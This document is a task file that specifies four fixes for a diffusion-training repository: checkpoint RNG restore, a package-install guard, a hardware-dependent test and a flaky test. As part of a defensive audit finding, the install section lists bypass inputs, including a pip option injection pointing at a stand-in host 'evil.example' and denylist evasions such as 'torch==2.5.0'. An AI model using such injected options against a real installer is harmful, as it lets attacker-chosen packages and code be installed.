# TASK: round-5 fixes

Repository `okolenmi/B580-diffusion-training`, start from `main` at `75e7c04` or
later. Same working rules as the earlier task files: one commit per WP
(`R5-NN: <summary>`, finding id and proving tests in the body), minimal diffs,
never weaken a test, run `python3 backend/tests/run_all.py`,
`python3 run_tests.py` and `python3 scripts/check_quality.py` before each
commit, fix the pattern and not only the instance (grep for siblings), every
`except Exception` logs, comments that say "safe/never/atomic" need a test.
Python 3.14+ is required. Repro scripts are in `repro-scripts-round5.tar.gz`.

---------------------------------------------------------------------------

### R5-01 Checkpoint recompute uses different dropout masks (training correctness)
**Where.** `nodes/model/gradient_checkpointing.py`,
`enable_frozen_param_safe_checkpointing` -> `FrozenParamSafeCheckpointFunction`
(`forward` / `backward`).
**Problem (reproduced on CPU, `r19_checkpoint_dropout.py`).** `forward` runs the
block under `no_grad`; `backward` re-runs it under `enable_grad` to rebuild the
graph. Nothing saves or restores the RNG state, so any random op inside the
block (LoRA/DoRA/NF4 `nn.Dropout` in `nodes/model/lora_phases.py`,
`dora_layer.py`, `nf4_lora_layer.py`) draws a **different mask** in the
recompute than the forward used. The upstream gradient belongs to mask A, the
recomputed Jacobian to mask B. Measured, same inputs and seed, relative
gradient error against an uncheckpointed run:

    dropout 0.0   ours 0.000e+00   torch.utils.checkpoint 0.000e+00
    dropout 0.1   ours 4.343e-01   torch.utils.checkpoint 0.000e+00
    dropout 0.5   ours 9.337e-01   torch.utils.checkpoint 0.000e+00

Latent while dropout is 0.0 (the default in `adapter_injection.py` /
`adapter_strategy.py`), wrong gradients whenever someone trains with LoRA
dropout > 0 and checkpointing on, which is the default on a 12 GB card. This is
the same family as the autocast bug already fixed in this file; the project's
checkpoint function is now wrong a third way.
**Do.**
1. In `forward`, before running the block, capture the CPU RNG state and, if any
   input tensor is on an accelerator, that device type's RNG state
   (`getattr(torch, device_type).get_rng_state(device_index)` for `xpu`/`cuda`;
   guard with `hasattr`). Store them on `ctx`.
2. In `backward`, run the recompute inside a context that restores them and puts
   the generator back afterwards, as `torch.utils.checkpoint` does with
   `preserve_rng_state=True` (use `torch.random.fork_rng(devices=[...],
   device_type=...)` plus `set_rng_state`, or the equivalent). The restore must
   wrap **only** the recompute, not the `torch.autograd.grad` call.
3. The generator state after `forward` must be the same as it would be for an
   uncheckpointed run (the forward consumed exactly what it consumed before), so
   training with a fixed seed stays reproducible. Add a test for that too.
4. Do not change behaviour when the block uses no randomness (no extra device
   syncs on the hot path beyond reading the state; reading `get_rng_state` is
   cheap, but measure and note it in the commit body).
**Tests.** Extend `nodes/smoke_tests/` next to the autocast regression test
(follow its style, including the control that proves the test can fail):
(a) dropout 0.1 and 0.5: checkpointed gradient equals the uncheckpointed
gradient to float tolerance (use the structure of `r19`); (b) the *stock*
function (no RNG handling) is shown to disagree, so the test cannot pass
vacuously; (c) RNG state after a checkpointed forward equals the state after the
same uncheckpointed forward; (d) a block with no randomness is unchanged;
(e) autocast and RNG restore together: dropout inside an autocast region still
matches.
**Also.** Add a one-line warning at graph build time when LoRA dropout > 0 and
checkpointing is enabled and this fix is not present? **No** -- once fixed there
is nothing to warn about; instead record the measurement in
`docs/design/12-installer-and-comfy-decoupling.md` section 7 next to the
autocast one.

### R5-02 The install guard is bypassable, and options can be injected
**Where.** `backend/application/use_cases/install_packages.py` (`StartInstall.execute`),
`backend/application/ports/package_installer.py` (`PipInstaller.build_command`),
`backend/presentation/api/installer.py`, `backend/presentation/schemas.py`
(`InstallerInstallIn`).
**Problem (reproduced at use-case level, `r20_install_denylist_bypass.py`).**
`POST /api/v1/installer/install` takes `packages`, `constraints` and
`comfy_venv_python` from the client. The check that protects ComfyUI's
virtualenv is `forbidden.intersection(packages)` on bare distribution names, so
these are all **accepted** for `target="comfy"`: `torch==2.5.0`, `Torch`,
`torch[opt]`, `torch>=1`, ` torch`, `pytorch-triton-xpu`. Strings starting with
`-` are accepted for both targets (`--index-url=http://evil.example/simple`,
`-r /path`), and `build_command` does `command += list(request.packages)` with
no `--` separator, so they reach pip as options. For `target="comfy"` the
interpreter that runs pip is `comfy_venv_python` straight from the request.
The Host/Origin guard keeps cross-site pages out, so this is reachable by local
callers or a buggy client -- and a buggy client sending a version specifier is
exactly the failure the commit message describes having happened once already.
**Do.**
1. A single `parse_requirement(text) -> Requirement` in the use-case layer that
   accepts only `name` or `name==version` (name per PEP 508, version per
   PEP 440), with no whitespace, no leading `-`, no URL, no path, no extras, no
   markers. Anything else raises `InstallError` naming the offending entry.
   Use `packaging` (already a server dependency) -- do not hand-roll the regex.
2. Compare names after `packaging.utils.canonicalize_name`, against **both** the
   `never_install` set (for `comfy`) and an allowlist: every requested name must
   be a distribution that appears in `REQUIREMENTS`. Unknown names are refused
   for both targets. (`pytorch-triton-xpu` must be added to `never_install` for
   `comfy` if it is not a manifest row -- check how the manifest lists torch's
   companions.)
3. `constraints`: each line must parse as `name==version`; reject lines starting
   with `-`, containing `://`, `@`, `;`, or whitespace. They are written to a
   constraints file, and pip honours option lines in such files.
4. `comfy_venv_python`: ignore the client's value. Use the interpreter the
   server detected for ComfyUI (what `plan("comfy")` returns); if the request
   supplies a different one, refuse with a clear message. The response already
   shows `target_python`, so the user can still see what will run.
5. `build_command`: put `--` before the package list.
**Tests.** In `test_install.py` style: the full matrix from `r20` (every bypass
variant refused for `comfy`; unknown name refused for both targets; option
strings refused for both); a canonicalisation test (`Torch`, `TORCH`, `torch_`
-> refused for comfy); constraint-line rejections; a mismatching
`comfy_venv_python` refused; `build_command` contains `--` immediately before
the first package and no package appears before it; the existing 36 checks still
pass; and a regression that the wizard's own request (what `install.js` sends)
is accepted. Run `scripts/test_install_executor.sh` (the real-pip variant) and
report the result.

### R5-03 `test_environment_port.py` needs an Intel XPU
**Problem (reproduced).** On a machine with no accelerator, three checks fail:
"at least this machine's card is listed (0)", "the current device is present",
"the enumerated list contains the device report() describes". The test uses the
real probe and assumes the machine running the suite has an XPU.
**Do.** Split the file: everything that can be proven with a fake probe stays in
the default suite; the checks that need real hardware move to a function (or a
second file, `test_environment_port_hw.py`) that is skipped with a clear
`SKIPPED: no xpu device on this machine` line when
`torch.xpu.is_available()` is false. `run_all.py` must count a skip as neither a
pass nor a failure and print the number of skips. A skipped file with zero checks
executed must not trip the "no checks ran" guard -- teach the guard about an
explicit skip marker rather than weakening it.
**Done when** the file passes on a CPU-only machine and still exercises the real
probe on the B580.

### R5-04 `test_process_identity.py` is flaky under load
**Problem (reproduced).** Run four copies in parallel on one CPU and about one
in twelve fails the check "and a real match is still True" in the fork-window
test (the check that follows the fix in `ab82bed`). A test that is green only
when the machine is idle will eventually make a real regression look like noise.
**Do.** Find the remaining timing assumption in that test (it reads a child's
cmdline in a window that depends on the scheduler). Replace sleeps and fixed
deadlines with a wait on an observable condition (poll `/proc/<pid>/cmdline`
until it is readable and non-empty, with a generous overall timeout, or
synchronise the child with a pipe/event it writes after `exec`). Then run the
file 50 times with 4 in parallel
(`for i in $(seq 50); do python3 backend/tests/test_process_identity.py & done`
in batches of 4) and report the number of failures; the target is 0.

---------------------------------------------------------------------------

## Still open from earlier rounds (improvements, not defects)
Not in the tree and not recorded as deferred: the **fault-injection invariant
tests** for the supervisor, the **orphan-child reaper**, the **soak script**, the
**child heartbeat**, and splitting `graph_supervisor.py`. Specs are in the
round-3 task file. After R5-01..04 do the fault-injection tests first.

## Final report
One line per WP (`done | partial | skipped`), commit, proving test, doubts, tests
changed and why. Anything not run on the B580 goes in
`docs/known-issues/pending-testing.md` -- for R5-01 that means the XPU RNG
restore path specifically: say so plainly if you could only run it on CPU.
